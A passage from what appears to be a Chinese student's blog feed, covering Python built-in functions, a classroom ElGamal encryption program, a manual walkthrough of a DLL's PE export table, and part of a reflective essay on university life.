class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">l =[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>list(map(lambda x,y: x+y,l,l))<br>Out[<span class="hljs-number">5</span>]: [<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>]<br></code></pre></td></tr></table></figure><blockquote><p>注：python3 和 python2 中 map()的返回值不一样， python2 中直接返回列表，python 需要加 list()转换取值。</p></blockquote><h1 id="filter-筛选函数"><a href="#filter-筛选函数" class="headerlink" title="filter-筛选函数"></a>filter-筛选函数</h1><p>按照 function 函数的规则在列表 sequence 中筛选数据</p><ul><li>用法：filter(function, sequence)</li></ul><h2 id="筛选-list-中符合条件的值"><a href="#筛选-list-中符合条件的值" class="headerlink" title="筛选 list 中符合条件的值"></a>筛选 list 中符合条件的值</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">l =[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>filter(<span class="hljs-keyword">lambda</span> x: x&gt;<span class="hljs-number">2</span>, l)<br>Out[<span class="hljs-number">6</span>]: [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure><h2 id="filter-与-map-返回值不同"><a href="#filter-与-map-返回值不同" class="headerlink" title="filter() 与 map() 返回值不同"></a>filter() 与 map() 返回值不同</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">l =[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>map(<span class="hljs-keyword">lambda</span> x: x&gt;<span class="hljs-number">2</span>, l)<br>Out[<span class="hljs-number">8</span>]: [<span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">True</span>, <span class="hljs-literal">True</span>]<br></code></pre></td></tr></table></figure><h1 id="reduce-——求积累运算"><a href="#reduce-——求积累运算" class="headerlink" title="reduce()——求积累运算"></a>reduce()——求积累运算</h1><p>reduce 函数功能是将 sequence 中数据，按照 function 函数操作，如将列表第一个数与第二个数进行 function 操作，得到的结果和列表中下一个数据进行 function 操作，一直循环下去…</p><ul><li>用法 reduce(function, sequence):</li></ul><h2 id="求积累和"><a href="#求积累和" class="headerlink" title="求积累和"></a>求积累和</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">l =[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br>reduce(<span class="hljs-keyword">lambda</span> x,y: x+y, l)<br>Out[<span class="hljs-number">10</span>]: <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h1 id="zip-打包函数"><a href="#zip-打包函数" class="headerlink" title="zip()打包函数"></a>zip()打包函数</h1><ul><li><p>zip()是 Python 的一个内建函数，它接受一系列可迭代的对象作为参数，将对象中对应的元素打包成一个个 tuple（元组），然后返回由这些 tuples 组成的 list（列表）。若传入参数的长度不等，则返回 list 的长度和参数中长度最短的对象相同。利用*号操作符，可以将 list unzip（解压）。</p></li><li><p>用法: zip(list,list)</p></li></ul><h2 id="zip-基本用法"><a href="#zip-基本用法" class="headerlink" title="zip()基本用法"></a>zip()基本用法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">l1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br>l2 = [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>]<br>zip(l1,l2)<br>Out[<span class="hljs-number">12</span>]: [(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span>), (<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;b&#x27;</span>), (<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;c&#x27;</span>), (<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;d&#x27;</span>)]<br></code></pre></td></tr></table></figure><h2 id="使用-逆过程"><a href="#使用-逆过程" class="headerlink" title="使用*逆过程"></a>使用<code>*</code>逆过程</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">l1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br>l2 = [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>]<br>zip_l1_l2 = zip(l1,l2)<br>zip(*zip_l1_l2)<br>Out[<span class="hljs-number">17</span>]: [(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>), (<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>)]<br></code></pre></td></tr></table></figure><h2 id="zip-构造字典"><a href="#zip-构造字典" class="headerlink" title="zip 构造字典"></a>zip 构造字典</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">l1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br>l2 = [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>]<br>zip_l1_l2 = zip(l1,l2)<br>dict(zip_l1_l2)<br>Out[<span class="hljs-number">18</span>]: &#123;<span class="hljs-number">1</span>: <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">2</span>: <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">3</span>: <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-number">4</span>: <span class="hljs-string">&#x27;d&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>这个操作就可以更加优雅的创造数据结构。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">In [<span class="hljs-number">63</span>]: a = collections.namedtuple(<span class="hljs-string">&#x27;stu&#x27;</span>,[<span class="hljs-string">&#x27;id&#x27;</span>,<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;sex&#x27;</span>])<br><br>In [<span class="hljs-number">64</span>]: a<br>Out[<span class="hljs-number">64</span>]: __main__.stu<br><br>In [<span class="hljs-number">65</span>]: s1 = a(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;11&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span>)<br><br>In [<span class="hljs-number">66</span>]: s1<br>Out[<span class="hljs-number">66</span>]: stu(id=<span class="hljs-number">1</span>, name=<span class="hljs-string">&#x27;11&#x27;</span>, sex=<span class="hljs-string">&#x27;f&#x27;</span>)<br><br>In [<span class="hljs-number">67</span>]: l1<br>Out[<span class="hljs-number">67</span>]: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br><br>In [<span class="hljs-number">68</span>]: l2 = [s1,s1,s1,s1]<br><br>In [<span class="hljs-number">69</span>]: ll = zip(l1,l2)<br><br>In [<span class="hljs-number">70</span>]: f = dict(ll)<br><br>In [<span class="hljs-number">71</span>]: f<br>Out[<span class="hljs-number">71</span>]:<br>&#123;<span class="hljs-number">1</span>: stu(id=<span class="hljs-number">1</span>, name=<span class="hljs-string">&#x27;11&#x27;</span>, sex=<span class="hljs-string">&#x27;f&#x27;</span>),<br> <span class="hljs-number">2</span>: stu(id=<span class="hljs-number">1</span>, name=<span class="hljs-string">&#x27;11&#x27;</span>, sex=<span class="hljs-string">&#x27;f&#x27;</span>),<br> <span class="hljs-number">3</span>: stu(id=<span class="hljs-number">1</span>, name=<span class="hljs-string">&#x27;11&#x27;</span>, sex=<span class="hljs-string">&#x27;f&#x27;</span>),<br> <span class="hljs-number">4</span>: stu(id=<span class="hljs-number">1</span>, name=<span class="hljs-string">&#x27;11&#x27;</span>, sex=<span class="hljs-string">&#x27;f&#x27;</span>)&#125;<br><br>In [<span class="hljs-number">72</span>]: f[<span class="hljs-number">1</span>]<br>Out[<span class="hljs-number">72</span>]: stu(id=<span class="hljs-number">1</span>, name=<span class="hljs-string">&#x27;11&#x27;</span>, sex=<span class="hljs-string">&#x27;f&#x27;</span>)<br><br>In [<span class="hljs-number">73</span>]: f[<span class="hljs-number">1</span>].id<br>Out[<span class="hljs-number">73</span>]: <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SecCrpytoExp-2</title>
      <link href="/2020/SecCrpytoExp-2/"/>
      <url>/2020/SecCrpytoExp-2/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="Elgamal-密码"><a href="#Elgamal-密码" class="headerlink" title="Elgamal 密码"></a>Elgamal 密码</h1><p>首先用到了几个强大的库（避免重复造轮子）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">from</span> Crypto.Util <span class="hljs-keyword">import</span> number<br></code></pre></td></tr></table></figure><p><code>sympy</code>用于计算原根，它是一个强大的符号计算的 python 库。不仅可以像 mathematica 一样进行符号计算，也内置了很多的 OI 实用算法，包括图论、计算几何、数论、多项式等等很多方面。</p><blockquote><p>更多用法可以看这里 <a href="https://2o181o28.github.io/2019/07/14/sympy%E7%9A%84OI%E7%94%A8%E6%B3%95/">https://2o181o28.github.io/2019/07/14/sympy%E7%9A%84OI%E7%94%A8%E6%B3%95/</a></p></blockquote><p><code>Crypto</code>则是更加强大的密码学库<br>然后就是 exp 了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Author: M@tr1x</span><br><span class="hljs-string">Date: 2020-11-06 17:15:32</span><br><span class="hljs-string">LastEditTime: 2020-11-08 12:14:15</span><br><span class="hljs-string">Description: Elgamal密码加解密程序</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util <span class="hljs-keyword">import</span> number<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> sympy<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Elgamal</span>():</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self,p_length</span>):</span><br>        self.p = number.getPrime(p_length)<span class="hljs-comment">#a random prime number with 2 ^ p_length</span><br>        self.x = random.randint(<span class="hljs-number">2</span>,self.p<span class="hljs-number">-3</span>)<span class="hljs-comment">#private key</span><br>        self.g = sympy.primitive_root(self.p)<span class="hljs-comment">#the smallest primitive root</span><br>        self.y = int(gmpy2.powmod(self.g,self.x,self.p))<span class="hljs-comment">#public key y</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">self,m</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;crypto function</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Args:</span><br><span class="hljs-string">            m (num): plain decimal message</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Returns:</span><br><span class="hljs-string">            y1,y2: encrypted k&amp;m</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        k = random.randint(<span class="hljs-number">1</span>,self.p<span class="hljs-number">-2</span>)<br>        <span class="hljs-keyword">while</span> int(gmpy2.gcd(k,self.p<span class="hljs-number">-1</span>))!=<span class="hljs-number">1</span>:<br>            k = random.randint(<span class="hljs-number">1</span>,self.p<span class="hljs-number">-2</span>)<br>        y1 = gmpy2.powmod(self.g,k,self.p)<br>        y2  = (m%self.p)*int(gmpy2.powmod(self.y,k,self.p))%self.p<br>        y1 = int(y1)<br><br>        <span class="hljs-keyword">return</span> y1,y2<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">self,y1,y2</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;decrypto function</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Args:</span><br><span class="hljs-string">            y1 (num):</span><br><span class="hljs-string">            y2 (num):</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Returns:</span><br><span class="hljs-string">            m: plain message</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        yi = int(gmpy2.invert(y1,self.p))<br>        m = int(gmpy2.powmod(yi,self.x,self.p))*(y2%self.p)%self.p<br>        <span class="hljs-keyword">return</span> m<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    new_elgamal = Elgamal(<span class="hljs-number">50</span>)<br>    (y1,y2) = new_elgamal.encrypt(<span class="hljs-number">9999999</span>)<span class="hljs-comment">#encrypt 9999999</span><br>    print(<span class="hljs-string">&quot;y1:&quot;</span>+str(y1))<br>    print(<span class="hljs-string">&quot;y2:&quot;</span>+str(y2))<br>    m = new_elgamal.decrypt(y1,y2)<span class="hljs-comment">#decrypt y1&amp;y2</span><br>    print(<span class="hljs-string">&quot;m:&quot;</span>+str(m))<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RE-Dll-export-table</title>
      <link href="/2020/RE-Dll-export-table/"/>
      <url>/2020/RE-Dll-export-table/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>#</p><p>首先查看 EXPORT Table 的 RVA 是 0x00092250<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1603444028068-ad438e4c-b122-42c7-ba5a-83c7ae4806d3.png#align=left&display=inline&height=258&name=image.png&originHeight=516&originWidth=1086&size=203973&status=done&style=none&width=543" alt="image.png"><br>通过 winhex 验证<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1603455279383-e976a9de-52f5-4102-8d74-45043d758e3f.png#align=left&display=inline&height=42&name=image.png&originHeight=84&originWidth=671&size=9325&status=done&style=none&width=335.5" alt="image.png">正确<br>由于 0x92250 在 rdata 节中，所以<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1603454081145-461ecd86-9d4b-4c6e-a33a-ef01d8fb30ad.png#align=left&display=inline&height=184&name=image.png&originHeight=368&originWidth=1225&size=149582&status=done&style=none&width=612.5" alt="image.png"><br>首个 IMAGE_EXPORT_DESCRIPTOR 结构的 RAW=0x92250-0x80000+0x65000=0x77250<br>通过 winhex 跳转到这里<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1603455598523-412c90f9-3d12-42c3-8f93-6a7daff2e1ea.png#align=left&display=inline&height=244&name=image.png&originHeight=332&originWidth=675&size=42132&status=done&style=none&width=497" alt="image.png"><br><strong>1.Name 成员解析</strong><br>  首先解析导出表重要的成员<br>Nmae: 在导出表一行位置处. 存储 0x096116，这是一个 RVA，所以我们要进行 RAW 转换.<br>0x96116-0x80000+0x65000=0x7b116<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1603455769163-2bf16888-d47a-4ee6-a24f-f8d8e086fb25.png#align=left&display=inline&height=64&name=image.png&originHeight=101&originWidth=689&size=15169&status=done&style=none&width=435" alt="image.png">跳转过来，可见这个成员保存的就是自己 DLL 的名称.<br><strong>2.Base 成员解析.   导出函数起始序号</strong><br>  导出函数的序号起始位置. 你 DLL 导出的函数.如果给序号了.那么就从这个序号开始. <br><strong>3.NumberOfFunctions  以及  NumberOfNmaes   函数导出总个数.以及函数以名字导出的个数</strong><br>这个两个成员很简单. 一个就是所有函数导出的个数.一个就是以名字进行导出的个数.  DLL 是可以以序号导出的.<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1603455964496-2dc24080-c9d9-4e4f-95aa-958acff9f512.png#align=left&display=inline&height=70&name=image.png&originHeight=96&originWidth=655&size=12020&status=done&style=none&width=476" alt="image.png">可以看出来都为 643 个<br><strong>4.函数地址表</strong><br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1603456041293-30e90886-2079-4009-8e49-eb43eaa1cbf8.png#align=left&display=inline&height=95&name=image.png&originHeight=123&originWidth=658&size=16557&status=done&style=none&width=509" alt="image.png"><br>这里同样存的都是 RVA,需要经过计算得到 RAW<br>函数地址表 RAW == 0x77278<br>函数名称表 RAW == 0x78b84<br>函数序号表 RAW == 0x7a490<br>根据 ppt 知道，函数地址表指向一个偏移. 这个偏移存放了函数所有导出个数的函数的地址.<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1603457781909-79fb89ae-6fb3-4532-be89-a5bce99a3411.png#align=left&display=inline&height=394&name=image.png&originHeight=788&originWidth=1459&size=295853&status=done&style=none&width=729.5" alt="image.png"><br>例如所有导出函数有 2 个. 那么函数地址表中就有 2 项. 每一个占 4 个字节. 存放的是函数入口地址 RVA.<br>例如第一项 RVA 偏移为 0x0162A0 + ImageBase 就是函数地址.<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1603457868779-48d9359e-6ae8-4e8c-ad2b-0a059b565a45.png#align=left&display=inline&height=89&name=image.png&originHeight=178&originWidth=1062&size=76968&status=done&style=none&width=531" alt="image.png"><br>然后查看 getcurrentThreadId<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1603456717020-230b1785-0618-43c4-a281-3f3b4ed9e41b.png#align=left&display=inline&height=146&name=image.png&originHeight=291&originWidth=1105&size=201152&status=done&style=none&width=552.5" alt="image.png"><br>它是第 21f 个函数，计算偏移后的地址为 542*4+0x77278=0x77af0<br>winhex 跳过去看<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1603457008523-72f609a4-c086-4c82-ae80-eb6e0bad17d7.png#align=left&display=inline&height=91&name=image.png&originHeight=106&originWidth=667&size=13804&status=done&style=none&width=572" alt="image.png"><br><strong>里面存放着函数的 RVA 偏移为 0x011a60，和 peview 中一致</strong><br><strong>若计算具体的函数地址，则为 0x011a60+0x6b800000=0x6b811a60</strong><br>通过 IDA 进行查看，同样验证结果<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1603452637541-3486e214-c493-4d87-9da6-ef459fe49f44.png#align=left&display=inline&height=112&name=image.png&originHeight=145&originWidth=801&size=21432&status=done&style=none&width=617" alt="image.png"><br>动态加载<br>右键<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1603461691144-416e3b0c-743f-4e5f-ad1d-3f446552aaa1.png#align=left&display=inline&height=353&name=image.png&originHeight=706&originWidth=1043&size=121278&status=done&style=none&width=521.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1603461291428-76543e86-2237-4b0f-a9c1-efb3407c8a9d.png#align=left&display=inline&height=82&name=image.png&originHeight=111&originWidth=686&size=24178&status=done&style=none&width=507" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1603460931535-b6415e24-9185-4dcb-80b4-57351eff24d3.png#align=left&display=inline&height=148&name=image.png&originHeight=296&originWidth=855&size=45777&status=done&style=none&width=427.5" alt="image.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.cnblogs.com/gd-luojialin/p/11306189.html">PE 知识复习之 PE 的导出表</a></li><li>【逆向】PE 结构分析和关于 PE 的一些问题及解决 <a href="https://www.shangmayuan.com/a/3289bd534203495c996382ae.html#%E5%AF%BC%E5%87%BA%E8%A1%A8">https://www.shangmayuan.com/a/3289bd534203495c996382ae.html</a></li><li>EAT 表 <a href="https://www.shuzhiduo.com/A/x9J2YK1gz6/">https://www.shuzhiduo.com/A/x9J2YK1gz6/</a></li><li>【逆向】【PE 入门】使用 PEView 分析 PE 文件 <a href="https://blog.csdn.net/qq_43633973/article/details/102378477">https://blog.csdn.net/qq_43633973/article/details/102378477</a></li><li>《逆向学习日记》 No.1 手动计算 RvaToRaw 来查看函数导入表与导出表 <a href="https://www.dazhuanlan.com/2020/01/02/5e0dc9725d3e9/">https://www.dazhuanlan.com/2020/01/02/5e0dc9725d3e9/</a></li><li>基址重定位表 <a href="https://blog.csdn.net/SKI_12/article/details/80636568">https://blog.csdn.net/SKI_12/article/details/80636568</a> <a href="https://zhuanlan.kanxue.com/article-10619.htm">https://zhuanlan.kanxue.com/article-10619.htm</a></li><li>PE 结构体中导出表/导入表解析——初阶 - 看雪学院的文章 - 知乎 <a href="https://zhuanlan.zhihu.com/p/33348352">https://zhuanlan.zhihu.com/p/33348352</a></li></ul><h1 id="用到的工具"><a href="#用到的工具" class="headerlink" title="用到的工具"></a>用到的工具</h1><ul><li>pe_tree <a href="https://github.com/blackberry/pe_tree">https://github.com/blackberry/pe_tree</a></li><li>winhex</li><li>peview</li><li>IDA PRO</li></ul>]]></content>
      
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> PEview </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Write-in-autumn</title>
      <link href="/2020/Write-in-autumn/"/>
      <url>/2020/Write-in-autumn/</url>
      
        <content type="html"><![CDATA[<p>写在西安的第三个秋天。</p><a id="more"></a><h1 id="大三，大三"><a href="#大三，大三" class="headerlink" title="大三，大三"></a>大三，大三</h1><p>转眼，大学生活就过去了一半，我已经是大三的学生了。回想起当初的懵懂无知，如今的我，对学业，对为人处世，对面对挫折，对坚持梦想，又有了新的感悟与理解。</p><p>我没有想过，大学，竟然比高中更累。或许是高中有同行者一同奋斗，我望着他们，不觉得苦罢。</p><p>上了大学，异地恋无疾而终，我在诺大的校园孤身一人。我可能也有朋友，但仅仅是朋友，没有交到可以交心的朋友，悲哀么。可能我习惯了一人，习惯了一个人吃饭，一个人去图书馆，一个人去自习，一个人去跑步。一个人真的很自由，但一个人真的很孤单。</p><p>上了大学，我见识到了很厉害的人，他们的均分很高，他们的竞赛很强。在大学，高的均分意味着你保研的时候能报更好的大学，像我这样天资一般，智商平平的人，只有付出更多的努力才能尽量与他们缩小差距，但你能想象吗，比你优秀的人比你更努力。我们专业第一的羽神，就是这样一个女生。我在我们宿舍应该是最努力的一个人，也仅仅是一天最多学习 2.5+3+4.5 个小时，但她可以做到全天都呆在自习室，真的佩服。</p><p>上了大学，我接触了许多新鲜事物，我参加了不少的竞赛，虽然很多竞赛都没有拿多好的成绩，但在过程中，我认为自己是有所收获的。我认识了很多好老师，他们给予了我很多的帮助，特别是我的科研导师，在我还是小白的时候，带着我们打比赛，写专利，真的非常非常幸运遇到这样的好老师。上了大学，我结识了五湖四海的人，他们性格迥异，爱好不同，虽然只是泛泛之交，但依旧能给生活增添光彩。</p><p>上了大学，竞争更加大了。我第一次听到”卷“这个名词，大概是在大二的时候，那时候我并不理解，但上了大三我才真正体会。评奖学金的时候，信安普通专业前四居然在全院也能排到前四，而且分差并不大。而在其中，我的基础均分是最弱的。其实我不想卷，我不想把大学生活过的比高三还苦，但是我有什么办法。我曾经以为的那么难的课程，羽神轻轻松松 95+，我真的是望其项背。都说分分分，学生的命根。可谁知道我们曾经也是鲜衣怒马的少年，我也想学吉他，弹钢琴，我也想在大学培养兴趣，但现实就是这样赤裸裸的，它告诉你，如果想去更好的学校，你的爱好就要放弃，你只能一心扑在学习上。</p><p>学业，竞赛，科研。我都想抓，但不可能都抓住。我只是个普通人，总要有舍弃，总要有权衡。</p><h1 id="生活？学习？"><a href="#生活？学习？" class="headerlink" title="生活？学习？"></a>生活？学习？</h1><p>西安前一阵子下了半个月的雨，终于晴天，久违的阳光让我恍惚间回到了曾经。</p><p>我好久没有停下脚步看一看这个世界了，这个美好的世界。<br><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/1629942/1603010881098-c3bb8b9e-9e7d-45bb-9f56-e734f2f8997b.jpeg?x-oss-process=image/auto-orient,1#align=left&display=inline&height=449&name=IMG_20201017_125701.jpg&originHeight=4624&originWidth=2080&size=8506344&status=done&style=none&width=202" alt="IMG_20201017_125701.jpg"><br>熹微的阳光透过树梢落到地上，斑驳一片，蓝天刚好。</p><p>我问自己，我们努力是为了什么。不就是为了更好的生活吗？为了更好的感知这个世界，为了更优雅的行走。所以何必要让自己如此焦虑？或许我的危机意识过重，我把结果看得太重。</p><p>这两天午后的阳光很好，慵懒地照在阳台上。所以我都选择回宿舍午休，支一把椅子在阳光下，就这样依着，靠着，眯眼休息。这大抵是一天中除了躺在床上外最美好的时光了。为什么要把自己搞得那么累，为什么要把自己逼得那么紧。</p><p>所以我开始思考，如何生活，如何平衡学习和生活。</p><p>每个人的一天都有 24 小时，除去睡觉的 9 个小时以及吃饭的 3 个小时，我们还剩下 12 个小时可以支配。唯一的最优解就是更加专注，提高处理事务的效率，才能省出更多的时间去休息，出去走走，把它们浪费在无用但美好的事情上。<br>大学还剩两年，谈恋爱对于我来说几乎不太可能。</p><h1 id="做出改变"><a href="#做出改变" class="headerlink" title="做出改变"></a>做出改变</h1><p>前几日，比较幸运的拿了国奖，虽然我并没有觉得生活发生了什么改善，但我突然觉得，我应该做出改变了。</p><h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p>我的均分一直是我的拉跨项。思维没有从高中转变过来。做事没有精益求精，还时常想当然。</p><h2 id="生活习惯"><a href="#生活习惯" class="headerlink" title="生活习惯"></a>生活习惯</h2><h3 id="睡眠"><a href="#睡眠" class="headerlink" title="睡眠"></a>睡眠</h3><p>首先是早睡。</p><p>晚上回到宿舍，总是浪费大量时间在 b 站等无意义的碎片娱乐上，这和宿舍的整体氛围有很大关系，舍友都在玩，都在看视频，都在大声说话，我不能要求他们，所以我也渐渐同化。但如果我想<strong>早起，</strong>我就必须<strong>早睡</strong>。</p><p>还好我们楼终于开始了熄灯制度，修复了不断电的 bug。（然而，信安协会找到了供电系统的 bug，一个未授权访问的漏洞，一通操作我们宿舍晚上不会断电了……）</p><p>我希望可以做到，熄灯即上床，并将手机放在桌子上，用另一个旧手机当闹钟。</p><h3 id="睡前活动"><a href="#睡前活动" class="headerlink" title="睡前活动"></a>睡前活动</h3><p>因为在 11 点半前我要上床，所以晚上回到宿舍后的每一分钟都很重要。</p><p>有以下几项必须完成：</p><ol><li>洗澡吹头发 or 洗脚（20 分种）</li><li>洗脸（8 分钟）</li><li>刷牙+剔牙（非常重要）（10 